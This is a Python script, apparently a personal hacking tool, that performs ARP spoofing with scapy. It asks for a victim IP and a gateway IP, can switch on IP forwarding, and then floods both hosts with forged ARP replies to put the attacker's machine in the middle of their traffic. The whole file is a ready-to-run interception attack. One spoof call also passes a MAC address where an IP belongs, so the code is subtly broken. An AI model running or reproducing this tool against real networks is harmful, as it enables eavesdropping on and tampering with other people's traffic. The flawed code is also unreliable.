import socket

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import UDP, IP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp


def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=1, verbose=False)[0][0][1].hwsrc
    return targetmac


def sendSpoofedArp(targetip, targetmac, sourceip):
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)


def getMyIP():
    my_ip = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [
        [(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in
         [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
    return my_ip


print("\033[2;32m")
print("    ___    ____  ____     ____  ____  _________ ____  _   ____________ ")
print("   /   |  / __ \/ __ \   / __ \/ __ \/  _/ ___// __ \/ | / / ____/ __ \ ")
print("  / /| | / /_/ / /_/ /  / /_/ / / / // / \__ \/ / / /  |/ / __/ / /_/ /")
print(" / ___ |/ _, _/ ____/  / ____/ /_/ // / ___/ / /_/ / /|  / /___/ _, _/ ")
print("/_/  |_/_/ |_/_/      /_/    \____/___//____/\____/_/ |_/_____/_/ |_|  ")
print("\n")
print("Created by: Matxin Jimenez   GitHub: Matx1n3  Web: matxin.eus")
print("\n")
print("\033[2;00m")

targetIP = input("Enter target IP: ")
gatewayIP = input("Enter gateway IP: ")
forwarding = input("Enable forwarding? [yes/no]: ")
print("\n")

if forwarding == "yes":
    print("Enabling forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
else:
    print("Disabling forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
print("\n")

try:
    targetMAC = getmac(targetIP)
    print("Target MAC: " + targetMAC)
except:
    print("Target machine did not response to ARP broadcast. Quitting...")
    quit()

try:
    gatewayMAC = getmac(gatewayIP)
    print("Gateway MAC: " + gatewayMAC)
except:
    print("Gateway is unreachable. Quitting...")
    quit()
print("\n")

try:
    print("Sending spoofed ARP responses... Pres ctr + c to exit")
    while True:
        sendSpoofedArp(gatewayIP, gatewayMAC, targetMAC)
        sendSpoofedArp(targetIP, targetMAC, gatewayIP)
except KeyboardInterrupt:
    print("\nARP spoofing stopped")

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
